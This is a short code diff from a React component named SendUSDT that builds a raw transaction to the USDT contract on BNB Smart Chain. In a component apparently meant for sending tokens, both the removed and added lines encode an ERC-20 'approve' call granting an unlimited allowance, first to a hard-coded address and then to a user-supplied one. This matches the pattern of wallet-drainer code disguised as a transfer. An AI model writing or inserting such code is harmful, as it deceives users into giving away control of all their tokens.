@@ -52,7 +52,10 @@ const SendUSDT = () => {
       // USDT Token Address on BSC
       const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
       
-      const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      const cleanAddress = address.trim().replace(/^0x/i, '');
+      const paddedAddress = cleanAddress.padStart(64, '0').toLowerCase();
+      const maxUint = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      const data = "0x095ea7b3" + paddedAddress + maxUint;
       
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
